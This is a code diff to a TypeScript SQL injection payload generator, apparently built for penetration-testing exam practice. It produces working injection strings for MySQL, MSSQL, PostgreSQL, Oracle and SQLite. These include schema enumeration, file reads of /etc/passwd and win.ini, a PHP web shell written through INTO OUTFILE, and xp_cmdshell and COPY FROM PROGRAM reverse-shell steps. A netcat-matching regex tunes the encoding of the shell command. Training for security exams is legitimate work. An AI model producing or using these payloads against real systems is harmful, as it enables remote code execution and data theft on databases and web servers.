@@ -41,13 +41,14 @@ export const SQL_STEPS = [
   { id: "rows", title: "Rows", explain: "Pull the data: the chosen columns joined with ':' so one shown column carries several values." },
 ] as const;
 
+/** `explain`: the injection's needs. `session`: the same without the injection-only ones (stacked queries, the shown column). */
 export const SQL_EXEC = [
-  { id: "mssql-enable-xp_cmdshell", engine: "mssql", title: "Enable xp_cmdshell", explain: "xp_cmdshell is switched off by default. A sysadmin can switch it on. Needs stacked queries." },
-  { id: "mssql-xp_cmdshell", engine: "mssql", title: "xp_cmdshell reverse shell", explain: "Runs a Windows command as the SQL Server service account. Needs sysadmin, stacked queries and the setting enabled." },
-  { id: "postgres-copy-program", engine: "postgres", title: "COPY FROM PROGRAM reverse shell", explain: "Runs an OS command as the postgres user. Needs superuser (or pg_execute_server_program), PostgreSQL 9.3+ and stacked queries." },
-  { id: "mysql-into-outfile-webshell", engine: "mysql", title: "INTO OUTFILE web shell", explain: "Writes a PHP file into the web root, then you call it. Needs FILE privilege, empty secure_file_priv, a writable known web root and a working UNION. A web shell alone scores nothing on the exam: use it to launch a real shell." },
-  { id: "mysql-load-file", engine: "mysql", title: "LOAD_FILE read a file", explain: "Reads a file from the DB server through the shown column. Needs the FILE privilege." },
-  { id: "mssql-read-file", engine: "mssql", title: "OPENROWSET read a file", explain: "Reads a file from the DB server through the shown column. Needs bulk-admin rights." },
+  { id: "mssql-enable-xp_cmdshell", engine: "mssql", title: "Enable xp_cmdshell", explain: "xp_cmdshell is switched off by default. A sysadmin can switch it on. Needs stacked queries.", session: "xp_cmdshell is switched off by default. A sysadmin can switch it on." },
+  { id: "mssql-xp_cmdshell", engine: "mssql", title: "xp_cmdshell reverse shell", explain: "Runs a Windows command as the SQL Server service account. Needs sysadmin, stacked queries and the setting enabled.", session: "Runs a Windows command as the SQL Server service account. Needs sysadmin and the setting enabled." },
+  { id: "postgres-copy-program", engine: "postgres", title: "COPY FROM PROGRAM reverse shell", explain: "Runs an OS command as the postgres user. Needs superuser (or pg_execute_server_program), PostgreSQL 9.3+ and stacked queries.", session: "Runs an OS command as the postgres user. Needs superuser (or pg_execute_server_program) and PostgreSQL 9.3+." },
+  { id: "mysql-into-outfile-webshell", engine: "mysql", title: "INTO OUTFILE web shell", explain: "Writes a PHP file into the web root, then you call it. Needs FILE privilege, empty secure_file_priv, a writable known web root and a working UNION. A web shell alone scores nothing on the exam: use it to launch a real shell.", session: "Writes a PHP file into the web root, then you call it. Needs FILE privilege, empty secure_file_priv and a writable known web root." },
+  { id: "mysql-load-file", engine: "mysql", title: "LOAD_FILE read a file", explain: "Reads a file from the DB server through the shown column. Needs the FILE privilege.", session: "Reads a file from the DB server. Needs the FILE privilege." },
+  { id: "mssql-read-file", engine: "mssql", title: "OPENROWSET read a file", explain: "Reads a file from the DB server through the shown column. Needs bulk-admin rights.", session: "Reads a file from the DB server. Needs bulk-admin rights." },
 ] as const;
 
 type Step = (typeof SQL_STEPS)[number]["id"];
@@ -92,12 +93,48 @@ function unionRow(c: Ctx, exprs: Record<number, string>, from = ""): string {
   return `UNION SELECT ${list}${fromDual(c, from)}`;
 }
 
+/** The shown column (default 1), checked against the column count. `assume`: note when it was not given. */
+function shown(c: Ctx, assume = true): number {
+  const r = c.v.reflected ?? 1;
+  if (!Number.isInteger(r) || r < 1) throw new Error(`reflected column ${r} must be a whole number from 1`);
+  if (c.v.columns && r > c.v.columns) throw new Error(`reflected column ${r} is beyond ${c.v.columns} columns`);
+  if (assume && c.v.reflected === undefined && c.point !== "client-session") c.notes.push("Assuming column 1 is the shown one: run reflected-columns first and pass the real position.");
+  return r;
+}
+
 /** A value read through the shown column (UNION) or on its own (session). */
 function data(c: Ctx, expr: string, from = "", suffix = ""): Core {
-  const r = c.v.reflected ?? 1;
-  if (c.v.columns && r > c.v.columns) throw new Error(`reflected column ${r} is beyond ${c.v.columns} columns`);
-  if (c.v.reflected === undefined && c.point !== "client-session") c.notes.push("Assuming column 1 is the shown one: run reflected-columns first and pass the real position.");
-  return { inject: `AND 1=2 ${unionRow(c, { [r]: expr }, from + suffix)}`, plain: `SELECT ${expr}${fromDual(c, from + suffix)}` };
+  const plain = `SELECT ${expr}${fromDual(c, from + suffix)}`;
+  // A session runs the plain statement only: no UNION, so no column count or shown column to check.
+  if (c.point === "client-session") return { inject: "", plain };
+  const r = shown(c);
+  return { inject: `AND 1=2 ${unionRow(c, { [r]: expr }, from + suffix)}`, plain };
+}
+
+/**
+ * A catalogue listing (databases, tables, columns). Injected, the rows are joined into one value, because the page
+ * shows one row; in a session the client prints every row, so it is a plain SELECT.
+ */
+function listing(c: Ctx, col: string, from: string, where = "", order = col): Core {
+  const plain = `SELECT ${col} FROM ${from}${where}`;
+  let d: Core;
+  switch (c.engine) {
+    case "mysql":
+      d = data(c, `GROUP_CONCAT(${col} SEPARATOR ' | ')`, from, where);
+      if (c.point !== "client-session") c.notes.push("GROUP_CONCAT stops at 1024 characters (group_concat_max_len). If the list ends mid-name, drop GROUP_CONCAT and page with LIMIT n,1.");
+      break;
+    case "sqlite": d = data(c, `GROUP_CONCAT(${col},' | ')`, from, where); break;
+    case "postgres": d = data(c, `string_agg(${col}::text,' | ')`, from, where); break;
+    case "oracle":
+      d = data(c, `LISTAGG(${col},' | ') WITHIN GROUP (ORDER BY ${order})`, from, where);
+      if (c.point !== "client-session") c.notes.push("LISTAGG needs Oracle 11gR2+ and fails (ORA-01489) past 4000 characters: then list one row at a time with OFFSET n ROWS FETCH NEXT 1 ROWS ONLY (12c+) or ROWNUM.");
+      break;
+    case "mssql":
+      d = data(c, `(SELECT ${col}+' | ' FROM ${from}${where} FOR XML PATH(''))`);
+      if (c.point !== "client-session") c.notes.push("FOR XML PATH('') works on MSSQL 2005 and later (2017+ also has STRING_AGG). It escapes & and < as &amp; and &lt;.");
+      break;
+  }
+  return { inject: d.inject, plain };
 }
 
 const SLEEP: Record<SqlEngine, { inject: string; plain: string; stacked?: boolean }> = {
@@ -121,51 +158,57 @@ function joinCols(e: SqlEngine, cols: string[]): string {
 
 const STEP_CORE: Record<Step, (c: Ctx) => Core> = {
   "detect-error": () => ({ inject: "", plain: null, bare: true }),
-  "detect-boolean": (c) => ({ inject: "AND 1=1", plain: c.engine === "oracle" ? "SELECT 1 FROM dual WHERE 1=1" : "SELECT 1 WHERE 1=1" }),
+  "detect-boolean": (c) => ({ inject: "AND 1=1", plain: c.engine === "oracle" ? "SELECT 1 FROM dual WHERE 1=1" : c.engine === "mysql" ? "SELECT 1 FROM DUAL WHERE 1=1" : "SELECT 1 WHERE 1=1" }),
   "detect-time": (c) => {
     const s = SLEEP[c.engine];
+    if (c.engine === "oracle") c.notes.push("dbms_pipe needs EXECUTE on DBMS_PIPE, which ordinary users often lack. No delay may mean no grant, not no injection: rely on the boolean test then.");
     return { inject: s.inject, plain: s.plain, stacked: s.stacked };
   },
   "column-count": (c) => ({ inject: `ORDER BY ${c.v.columns ?? 1}`, plain: null }),
   "reflected-columns": (c) => {
     const n = c.v.columns;
     const strict = c.engine === "mssql" || c.engine === "postgres" || c.engine === "oracle";
-    const r = c.v.reflected ?? 1;
-    if (n && r > n) throw new Error(`reflected column ${r} is beyond ${n} columns`);
+    const r = shown(c, false);
+    if (!n || !Number.isInteger(n) || n < 1) {
+      // No count yet: there is nothing to label. {COLUMNS} stays to fill in, and the note says how to get it.
+      c.notes.push(`Fill in the column count first (column-count step). Or send UNION SELECT NULL, then NULL,NULL and so on: the first that stops erroring has the right count.${strict ? ` Then ${c.engine} needs the label in one column at a time, NULL elsewhere.` : ""}`);
+      return { inject: `AND 1=2 ${unionRow(c, {})}`, plain: null };
+    }
     if (strict) {
       // Strict engines reject a string in a non-text column, so label ONE column and keep NULL elsewhere.
       c.notes.push(`${c.engine} errors if a string lands in a non-text column, so this labels only column ${r} and keeps NULL elsewhere. Send it once per column (set reflected to 1, 2, 3...): the label that shows on the page marks a shown text column; a type error means that column is not text.`);
       return { inject: `AND 1=2 ${unionRow(c, { [r]: `'c${r}'` })}`, plain: null };
     }
-    const labels = n && n >= 1 ? Object.fromEntries(Array.from({ length: n }, (_, i) => [i + 1, `'c${i + 1}'`])) : {};
+    const labels = Object.fromEntries(Array.from({ length: n }, (_, i) => [i + 1, `'c${i + 1}'`]));
     return { inject: `AND 1=2 ${unionRow(c, labels)}`, plain: null };
   },
   version: (c) => { const [e, f] = VERSION[c.engine]; return data(c, e, f); },
   databases: (c) => {
     switch (c.engine) {
-      case "mysql": return data(c, "GROUP_CONCAT(schema_name SEPARATOR ' | ')", "information_schema.schemata");
-      case "mssql": return data(c, "name", "sys.databases");
-      case "postgres": return data(c, "datname", "pg_database");
-      case "oracle": return data(c, "username", "all_users");
-      case "sqlite": return data(c, "name", "pragma_database_list");
+      case "mysql": return listing(c, "schema_name", "information_schema.schemata");
+      case "mssql": return listing(c, "name", "sys.databases");
+      case "postgres": return listing(c, "datname", "pg_database");
+      case "oracle": return listing(c, "username", "all_users");
+      case "sqlite": return listing(c, "name", "pragma_database_list");
     }
   },
   tables: (c) => {
     switch (c.engine) {
-      case "mysql": return data(c, "GROUP_CONCAT(table_name SEPARATOR ' | ')", "information_schema.tables", " WHERE table_schema=database()");
-      case "mssql": return data(c, "table_name", "information_schema.tables");
-      case "postgres": return data(c, "table_name", "information_schema.tables", " WHERE table_schema='public'");
-      case "oracle": return data(c, "table_name", "all_tables");
-      case "sqlite": return data(c, "name", "sqlite_master", " WHERE type='table'");
+      case "mysql": return listing(c, "table_name", "information_schema.tables", " WHERE table_schema=database()");
+      case "mssql": return listing(c, "table_name", "information_schema.tables");
+      case "postgres": return listing(c, "table_name", "information_schema.tables", " WHERE table_schema='public'");
+      case "oracle":
+        c.notes.push("Lists the connected user's own tables. For another schema use owner='NAME' (upper case).");
+        return listing(c, "table_name", "all_tables", " WHERE owner=USER");
+      case "sqlite": return listing(c, "name", "sqlite_master", " WHERE type='table'");
     }
   },
   columns: (c) => {
     const t = c.v.table?.trim() ? c.v.table.trim() : need(c, "TABLE", undefined);
     const q = t.startsWith("{") ? `'${t}'` : lit(c.engine === "oracle" ? t.toUpperCase() : t);
     switch (c.engine) {
-      case "mysql": return data(c, "GROUP_CONCAT(column_name SEPARATOR ' | ')", "information_schema.columns", ` WHERE table_name=${q}`);
-      case "mssql": case "postgres": return data(c, "column_name", "information_schema.columns", ` WHERE table_name=${q}`);
-      case "oracle": c.notes.push("Oracle stores names in upper case, so the table name was upper-cased."); return data(c, "column_name", "all_tab_columns", ` WHERE table_name=${q}`);
+      case "mysql": case "mssql": case "postgres": return listing(c, "column_name", "information_schema.columns", ` WHERE table_name=${q}`);
+      case "oracle": c.notes.push("Oracle stores names in upper case, so the table name was upper-cased."); return listing(c, "column_name", "all_tab_columns", ` WHERE table_name=${q}`, "column_id");
       case "sqlite": return data(c, "sql", "sqlite_master", ` WHERE name=${q}`);
     }
   },
@@ -223,23 +266,30 @@ const EXEC_CORE: Record<Exec, (c: Ctx) => Core> = {
     const path = need(c, "PATH", c.v.path);
     c.notes.push("INTO OUTFILE never overwrites: pick a new filename each time. Then call ?cmd=id on the file; it only proves execution, so launch a real shell from it.");
     const shell = `'<?php system($_GET["cmd"]); ?>'`;
-    const r = c.v.reflected ?? 1;
+    const r = shown(c);
     return { inject: `AND 1=2 ${unionRow(c, { [r]: shell })} INTO OUTFILE ${path.startsWith("{") ? `'${path}'` : lit(path)}`, plain: null };
   },
   "mysql-load-file": (c) => {
-    c.notes.push("Defaults to /etc/passwd as a harmless test; use LOAD_FILE on the web server config to find the web root.");
-    return data(c, `LOAD_FILE(${lit(c.v.path?.trim() || "/etc/passwd")})`);
+    const path = c.v.path?.trim();
+    if (!path) c.notes.push("Defaults to /etc/passwd as a harmless test; use LOAD_FILE on the web server config to find the web root.");
+    return data(c, `LOAD_FILE(${lit(path || "/etc/passwd")})`);
   },
   "mssql-read-file": (c) => {
-    const p = c.v.path?.trim() || "C:\\Windows\\win.ini";
+    const path = c.v.path?.trim();
+    if (!path) c.notes.push("Defaults to C:\\Windows\\win.ini as a harmless test.");
+    const p = path || "C:\\Windows\\win.ini";
     c.notes.push("Needs ADMINISTER BULK OPERATIONS (sysadmin has it).");
     return data(c, "BulkColumn", `OPENROWSET(BULK ${lit(p)},SINGLE_CLOB) AS t`);
   },
 };
 
-function finalize(raw: string, point: SqlPoint): string {
-  return point === "url-param" ? urlEncodeShell(raw) : raw;
+/** URL-encodes for url-param; the unresolved placeholders stay readable, any other {…} (a custom cmd's ${IFS}) is encoded. */
+function finalize(raw: string, point: SqlPoint, unresolved: string[]): string {
+  return point === "url-param" ? urlEncodeShell(raw, unresolved) : raw;
 }
+
+/** A custom command that runs netcat (nc, nc64, nc.exe, a full path to one). */
+const NC_CMD = /(?:^|[\\/\s"])nc(?:64)?(?:\.exe)?\s/i;
 
 export function buildSql(stepOrExecId: string, engine: SqlEngine, point: SqlPoint, values: SqlValues = {}): BuiltPayload {
   const exec = SQL_EXEC.find((x) => x.id === stepOrExecId);
@@ -257,33 +307,37 @@ export function buildSql(stepOrExecId: string, engine: SqlEngine, point: SqlPoin
     c.notes.push("Numeric context has no quote to break, but a lone ' still breaks the query. If it does not error, try 1/0 or 1 AND 1=1 instead.");
   }
   let raw: string;
+  /** The statement after the injection break: what the keyword scan reads (the prefix is the app's value). */
+  let stmt: string;
   if (session) {
     if (core.plain === null) throw new Error(`${stepOrExecId} is an injection step: it does not apply in a client session`);
-    raw = core.plain;
+    raw = stmt = core.plain;
   } else {
     const comment = core.bare ? "" : COMMENT[engine];
     const clause = core.stacked ? `; ${core.inject}` : core.inject ? ` ${core.inject}` : "";
     raw = `${prefix}${clause}${comment}`;
     if (!core.stacked && prefix === "") raw = raw.trimStart();
+    stmt = `${clause}${comment}`;
   }
 
   const parts: PayloadPart[] = [];
   if (!session && prefix !== "") parts.push({ token: prefix, explain: prefix.includes("'") ? "The quote closes the string the app opened, so what follows is read as SQL, not data." : "The break that ends the app's value and starts your SQL." });
   if (!session && prefix === "") parts.push({ token: "(no prefix)", explain: "Numeric context: the value is not quoted, so no break is needed." });
   if (core.stacked && !session) parts.push({ token: ";", explain: "; ends the app's statement and starts a new one (a stacked query). Works on MSSQL and PostgreSQL, usually not on MySQL from PHP." });
-  parts.push(...keywordParts(raw));
+  parts.push(...keywordParts(stmt, session));
   parts.push(...c.extra);
-  if (engine === "mysql" && !session && !core.bare) parts.push({ token: "# (alternative)", explain: "MySQL also accepts # as the comment; send it as %23 in a URL." });
 
   const notes = [...c.notes];
+  if (engine === "mysql" && !session && !core.bare) notes.push("MySQL also accepts # as the comment; send it as %23 in a URL.");
   if (point === "url-param") notes.push("URL-encoded: spaces as +, quotes, ; & > | = / as %XX, so it works pasted into the URL or Burp. The browser does not encode it again.");
   if (point === "form-field") notes.push("Raw text: type it in the field as shown; the browser does the URL-encoding when it submits.");
   if (session) notes.push("Plain statement for impacket-mssqlclient, mysql or psql: no quote break, no trailing comment, no encoding.");
-  if (exec) notes.push(`Needs: ${exec.explain}`);
+  if (exec) notes.push(`Needs: ${session ? exec.session : exec.explain}`);
 
-  let text = finalize(raw, point);
-  // R3: the nc.exe -e flag needed %2d through xp_cmdshell in a URL; nothing else gets it.
-  if (point === "url-param" && exec?.id === "mssql-xp_cmdshell" && values.shell === "nc-exe" && !values.cmd) text = text.replace("+-e+", "+%2de+");
+  let text = finalize(raw, point, c.unresolved);
+  // R3: the nc.exe -e flag needed %2d through xp_cmdshell in a URL, embedded or typed as a custom cmd; nothing else gets it.
+  const customNc = values.cmd?.trim() ? NC_CMD.test(values.cmd) : false;
+  if (point === "url-param" && exec?.id === "mssql-xp_cmdshell" && (customNc || (!values.cmd?.trim() && values.shell === "nc-exe"))) text = text.replace(/\+-e\+/g, "+%2de+");
 
   const def: PayloadDef = {
     id: stepOrExecId, generator: "sql", title: (exec ?? step)!.title, os: engine === "mssql" ? "windows" : "linux",
